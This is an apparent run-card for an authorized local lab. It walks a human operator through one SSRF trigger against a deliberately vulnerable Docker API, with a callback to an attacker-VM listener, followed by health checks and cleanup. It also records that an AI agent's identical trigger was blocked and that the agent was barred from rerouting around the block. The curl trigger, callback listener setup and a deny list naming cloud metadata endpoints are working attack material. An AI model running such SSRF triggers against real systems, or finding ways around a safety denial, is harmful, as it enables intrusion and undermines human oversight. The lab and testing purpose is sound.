> Public sanitized edition: sensitive personal, target, path, IP, alias, advisory, and run-specific evidence fields are redacted. This repository does not authorize live testing.

# SSRF Operator Run-Card — modern_vuln_api true attacker callback

Status: operator-run / authorized local lab only / do not auto-execute from Hermes after safety-layer denial
Date: 2026-05-23
Purpose: complete the previously blocked SSRF trigger manually, while preserving the same safe local-lab boundaries.

## Why this is operator-run

Hermes previously prepared the callback route and target, but the exact trigger request:

```text
/fetch?url=http://<lab-ip>:18183/...
```

was denied by the execution layer with `BLOCKED: User denied. Do NOT retry.` Hermes must not disguise, encode, split, or reroute the same trigger to bypass that block. If the operator wants this local authorized proof completed, the clean route is: Hermes prepares a run-card; the human operator runs the one bounded trigger manually; Hermes can later pull artifacts and record the result.

## Scope / hard boundaries

Allowed:

- Local lab only.
- Attacker VM: `<attacker-vm>` / `<lab-ip>`.
- Victim VM: `<victim-vm>` / `<lab-ip>`.
- Target: local Docker-published `modern_vuln_api` only.
- Exactly one SSRF trigger request to the lab target.
- Callback only to the attacker VM Docker-published listener.

Not allowed in this run-card:

- No cloud metadata endpoints: `169.254.169.254`, `metadata.google.internal`, etc.
- No localhost/internal scans.
- No loops, fuzzing, brute force, or crawler behavior.
- No public OAST/interactsh.
- No public/unknown target.
- No secrets, credentials, token capture, or exfiltration.
- No automatic report/finding promotion.

## Expected proof

Success requires all of these:

1. Pre-health on target is HTTP 200.
2. Trigger returns HTTP 200 from `/fetch` or a meaningful target response that shows server-side fetch attempted.
3. Attacker listener log contains the unique marker and source IP `<lab-ip>`.
4. Post-health on target is HTTP 200.
5. Cleanup removes listener and target containers.
6. NAT/Internet remains closed or is re-closed and verified.

## 2026-05-23 connection-fix note

The first Kali-side run exposed a route/startup issue before the SSRF trigger: after failure cleanup, the victim container was absent, and direct `curl http://<lab-ip>:18081/health` timed out. The fixed script now:

- publishes callback and target containers on `0.0.0.0` instead of binding only the host-only IP;
- waits/retries victim local health and attacker-to-victim health before any trigger;
- supports `--precheck-only` for setup testing without sending `/fetch`;
- collects diagnostics on failure;
- keeps the exact confirmation gate before the sensitive trigger.

Precheck validation completed from Hermes without sending the SSRF trigger:

```text
RUN_ID=modern_api_ssrf_operator_20260523T074042Z
pre_health=200
listener precheck OK
verdict: setup_ready_no_ssrf_trigger_sent
cleanup complete; attacker internet: internet_closed
```

## Easier option: run the prepared Kali-side script

If you prefer not to copy/paste all PowerShell commands, run this manually inside `<attacker-vm>`:

```bash
cd /mnt/hacking
bash scripts/labs/operator_ssrf_true_callback_run.sh
```

The script starts the attacker listener, starts the victim target, verifies pre-health and listener precheck, then pauses and requires this exact confirmation before the sensitive trigger:

```text
RUN_SSRF_ON_LOCAL_LAB
```

It sends exactly one SSRF trigger, writes artifacts under:

```text
/home/kali/<artifact-output-dir>/<RunId>/
```

After completion, pull artifacts from Windows with:

```powershell
cd <private-workspace>
$env:MSYS2_ARG_CONV_EXCL='*'
.\scripts\kali-pull.ps1 -RemotePath "/home/kali/<artifact-output-dir>/<RunId>"
Remove-Item Env:\MSYS2_ARG_CONV_EXCL -ErrorAction SilentlyContinue
```

Replace `<RunId>` with the run ID printed by the script.

## Full manual option: run from Windows PowerShell

Open PowerShell in:

```powershell
cd <private-workspace>
```

### 1) Set run variables

```powershell
$RunId = "modern_api_ssrf_operator_$(Get-Date -Format yyyyMMddTHHmmssZ)"
$AttackerIp = "<lab-ip>"
$VictimIp = "<lab-ip>"
$CallbackPort = 18183
$TargetPort = 18081
$CallbackUrl = "http://$AttackerIp`:$CallbackPort/ssrf-callback?marker=$RunId"
$TargetUrl = "http://$VictimIp`:$TargetPort"
$EncodedCallback = [System.Uri]::EscapeDataString($CallbackUrl)
$TriggerUrl = "$TargetUrl/fetch?url=$EncodedCallback"
$RunId
$CallbackUrl
$TriggerUrl
```

### 2) Start attacker Docker-published callback listener

This uses the already-created project helper `tmp/ssrf_docker_listener.py`.

```powershell
.\scripts\kali-run.ps1 -Command "RUN_ID=$RunId; OUT=\$HOME/<artifact-output-dir>/\$RUN_ID; mkdir -p \$OUT/callback; docker rm -f ssrf-callback-$CallbackPort >/dev/null 2>&1 || true; docker run -d --name ssrf-callback-$CallbackPort -p $AttackerIp`:$CallbackPort`:8080 -v /mnt/hacking/tmp/ssrf_docker_listener.py:/listener.py:ro -v \$OUT/callback:/out python:3-alpine python /listener.py; docker ps | grep ssrf-callback-$CallbackPort"
```

### 3) Copy/start victim target

```powershell
$sshkey = "setting/local/ssh/kali_codex_ed25519"
$known = "setting/local/ssh/known_hosts"
$cfg = "setting/local/ssh/empty_ssh_config"
ssh.exe -F $cfg -i $sshkey -p 22 -o UserKnownHostsFile=$known -o StrictHostKeyChecking=accept-new kali@$VictimIp "mkdir -p /home/kali/hermes-labs/modern_vuln_api"
scp.exe -F $cfg -i $sshkey -P 22 -o UserKnownHostsFile=$known -o StrictHostKeyChecking=accept-new labs/modern_vuln_api/modern_vuln_api.py kali@$VictimIp`:/home/kali/hermes-labs/modern_vuln_api/modern_vuln_api.py
.\scripts\kali-run.ps1 -HostName $VictimIp -Command "docker rm -f modern-api-ssrf-$TargetPort >/dev/null 2>&1 || true; docker run -d --name modern-api-ssrf-$TargetPort -p $VictimIp`:$TargetPort`:$TargetPort -v /home/kali/hermes-labs/modern_vuln_api:/app:ro python:3-alpine python /app/modern_vuln_api.py --host 0.0.0.0 --port $TargetPort; docker ps | grep modern-api-ssrf-$TargetPort"
```

### 4) Pre-health and listener reachability checks

```powershell
.\scripts\kali-run.ps1 -Command "mkdir -p \$HOME/<artifact-output-dir>/$RunId/http; curl -sS -m 5 -o \$HOME/<artifact-output-dir>/$RunId/http/pre_health.json -w 'pre_health:%{http_code}`n' $TargetUrl/health"
.\scripts\kali-run.ps1 -HostName $VictimIp -Command "mkdir -p \$HOME/<artifact-output-dir>/$RunId/http; curl -sS -m 5 -o \$HOME/<artifact-output-dir>/$RunId/http/listener_probe.txt -w 'listener_probe:%{http_code}`n' '$CallbackUrl&phase=precheck'"
.\scripts\kali-run.ps1 -Command "cat \$HOME/<artifact-output-dir>/$RunId/callback/requests.jsonl 2>/dev/null || true"
```

Expected listener precheck: callback log should show a request from `<lab-ip>` with `phase=precheck`.

### 5) Operator-run SSRF trigger — exactly one request

Run this only if the precheck above succeeded and the printed `$TriggerUrl` only points to `<lab-ip>:18183`.

```powershell
.\scripts\kali-run.ps1 -Command "mkdir -p \$HOME/<artifact-output-dir>/$RunId/http; curl -sS -m 8 -o \$HOME/<artifact-output-dir>/$RunId/http/ssrf_trigger_response.json -w 'ssrf_trigger:%{http_code}`n' '$TriggerUrl'"
```

Do not modify this into metadata URLs, localhost URLs, scans, loops, or public callback services.

### 6) Verify callback evidence and post-health

```powershell
.\scripts\kali-run.ps1 -Command "echo '--- callback log ---'; cat \$HOME/<artifact-output-dir>/$RunId/callback/requests.jsonl 2>/dev/null || true; echo '--- trigger response ---'; cat \$HOME/<artifact-output-dir>/$RunId/http/ssrf_trigger_response.json 2>/dev/null || true; echo; curl -sS -m 5 -o \$HOME/<artifact-output-dir>/$RunId/http/post_health.json -w 'post_health:%{http_code}`n' $TargetUrl/health"
```

### 7) Cleanup

```powershell
.\scripts\kali-run.ps1 -Command "mkdir -p \$HOME/<artifact-output-dir>/$RunId/cleanup; docker rm -f ssrf-callback-$CallbackPort > \$HOME/<artifact-output-dir>/$RunId/cleanup/attacker_listener_cleanup.txt 2>&1 || true; if timeout 3 bash -lc '</dev/tcp/1.1.1.1/80' 2>/dev/null; then echo internet_open > \$HOME/<artifact-output-dir>/$RunId/cleanup/attacker_internet.txt; else echo internet_closed > \$HOME/<artifact-output-dir>/$RunId/cleanup/attacker_internet.txt; fi; cat \$HOME/<artifact-output-dir>/$RunId/cleanup/attacker_internet.txt"
.\scripts\kali-run.ps1 -HostName $VictimIp -Command "mkdir -p \$HOME/<artifact-output-dir>/$RunId/cleanup; docker rm -f modern-api-ssrf-$TargetPort > \$HOME/<artifact-output-dir>/$RunId/cleanup/target_cleanup.txt 2>&1 || true; if timeout 3 bash -lc '</dev/tcp/1.1.1.1/80' 2>/dev/null; then echo internet_open > \$HOME/<artifact-output-dir>/$RunId/cleanup/victim_internet.txt; else echo internet_closed > \$HOME/<artifact-output-dir>/$RunId/cleanup/victim_internet.txt; fi; cat \$HOME/<artifact-output-dir>/$RunId/cleanup/victim_internet.txt"
```

### 8) Pull artifacts back to Windows

```powershell
$env:MSYS2_ARG_CONV_EXCL='*'
.\scripts\kali-pull.ps1 -RemotePath "/home/kali/<artifact-output-dir>/$RunId"
.\scripts\kali-pull.ps1 -HostName $VictimIp -RemotePath "/home/kali/<artifact-output-dir>/$RunId"
Remove-Item Env:\MSYS2_ARG_CONV_EXCL -ErrorAction SilentlyContinue
```

Artifact location should be:

```text
<private-workspace>\<artifact-output-dir>\<RunId>\
```

## After you run it

Send Hermes the `RunId` and/or paste the callback log + trigger response. Hermes should then:

1. Verify callback source IP and marker.
2. Verify positive/control evidence and pre/post health.
3. Update `handoff/modern_api_ssrf_attacker_callback_attempt_20260523.md` or create a verified follow-up handoff.
4. Update `modules/bundles/verified_lab_flow_modern_api_ssrf_isolated_callback.md`.
5. Update `handoff/accepted_changes.md`, `handoff/current_navigation.md`, and Obsidian.

## Verification checklist

- [ ] Callback precheck from victim to attacker succeeded.
- [ ] Exactly one SSRF trigger was sent.
- [ ] Callback log contains the unique marker from `RunId`.
- [ ] Callback source IP is `<lab-ip>`.
- [ ] Trigger response was saved.
- [ ] Pre/post health are 200.
- [ ] Containers removed.
- [ ] Attacker/victim Internet closed.
- [ ] Artifacts pulled to Windows.
